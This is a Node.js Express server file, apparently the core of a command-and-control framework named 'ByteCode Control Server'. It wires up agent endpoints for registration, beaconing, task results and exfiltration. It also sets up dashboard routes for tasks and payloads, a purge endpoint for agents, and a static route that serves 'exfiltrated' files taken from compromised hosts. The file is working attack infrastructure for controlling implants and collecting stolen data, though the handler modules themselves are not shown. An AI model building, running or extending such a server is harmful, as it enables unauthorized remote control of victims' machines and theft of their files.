const path = require('path');
const express = require('express');
const cors = require('cors');
const { initializeDatabase } = require('./config/db');

// Initialize database
initializeDatabase();

const app = express();
const PORT = process.env.PORT || 3001;

// ── Middleware ──────────────────────────────────────────
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Request logger
app.use((req, res, next) => {
  const timestamp = new Date().toISOString();
  const method = req.method;
  const url = req.originalUrl;
  console.log(`[${timestamp}] ${method} ${url}`);
  next();
});

// ── Routes ─────────────────────────────────────────────

// Agent routes (no JWT, uses API key)
app.use('/api/register', require('./routes/register'));
app.use('/api/beacon', require('./routes/beacon'));
app.use('/api/result', require('./routes/results'));
app.use('/api/exfiltrate', require('./routes/exfiltrate'));

// Immediate Purge Override
app.post('/api/agents/purge/:id', require('./middleware/auth').verifyToken, (req, res) => {
  const Agent = require('./models/agent');
  console.log(`[OVERRIDE] Attempting purge for ID: ${req.params.id}`);
  try {
    Agent.remove(req.params.id);
    console.log(`[OVERRIDE] Agent ${req.params.id} PURGED`);
    res.json({ ok: true });
  } catch (err) {
    console.error('[OVERRIDE] Purge Error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

// Dashboard routes (JWT protected)
app.use('/api/auth', require('./routes/auth'));
app.use('/api/agents', require('./routes/agents'));
app.use('/api/tasks', require('./routes/tasks'));
app.use('/api/payloads', require('./routes/payloads'));

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    status: 'operational',
    server: 'ByteCode Control Server',
    version: '1.0.0',
    uptime: process.uptime(),
    timestamp: new Date().toISOString()
  });
});

// ── Static Dashboard Files ─────────────────────────────
// Locate dashboard/dist relative to this file
const distPath = path.join(__dirname, '../../dashboard/dist');
app.use(express.static(distPath));
app.use('/exfiltrated', (req, res, next) => {
  console.log(`[DOWNLOAD] Request for exfiltrated file: ${req.url}`);
  next();
}, express.static(path.join(__dirname, '../../exfiltrated_files')));

// Catch-all for SPA routing (must be after /api routes)
app.get('*', (req, res, next) => {
  if (req.url.startsWith('/api')) return next();
  res.sendFile(path.join(distPath, 'index.html'));
});

// 404 handler for API
app.use('/api', (req, res) => {
  res.status(404).json({ error: 'API Endpoint not found' });
});

// Error handler
app.use((err, req, res, next) => {
  console.error('[ERROR]', err.stack);
  res.status(500).json({ error: 'Internal server error' });
});

const http = require('http');
const wsManager = require('./utils/wsManager');

// ── Start ──────────────────────────────────────────────
const server = http.createServer(app);

wsManager.initialize(server);

server.listen(PORT, () => {
  console.log('\x1b[36m');
  console.log('  ██████╗ ██╗   ██╗████████╗███████╗ ██████╗  ██████╗ ██████╗ ███████╗');
  console.log('  ██╔══██╗╚██╗ ██╔╝╚══██╔══╝██╔════╝██╔════╝ ██╔═══██╗██╔══██╗██╔════╝');
  console.log('  ██████╔╝ ╚████╔╝    ██║   █████╗  ██║      ██║   ██║██║  ██║█████╗  ');
  console.log('  ██╔══██╗  ╚██╔╝     ██║   ██╔══╝  ██║      ██║   ██║██║  ██║██╔══╝  ');
  console.log('  ██████╔╝   ██║      ██║   ███████╗╚██████╗ ╚██████╔╝██████╔╝███████╗');
  console.log('  ╚═════╝    ╚═╝      ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝');
  console.log('\x1b[0m');
  console.log('  \x1b[1m\x1b[34m[SYSTEM CONFIGURATION]\x1b[0m');
  console.log(`  \x1b[32m[+]\x1b[0m Control URL:   \x1b[4mhttp://localhost:${PORT}\x1b[0m`);
  console.log(`  \x1b[32m[+]\x1b[0m API Endpoint:  \x1b[4mhttp://localhost:${PORT}/api\x1b[0m`);
  console.log(`  \x1b[32m[+]\x1b[0m Real-time Hub: \x1b[1mWS ENABLED\x1b[0m`);
  console.log('');
});

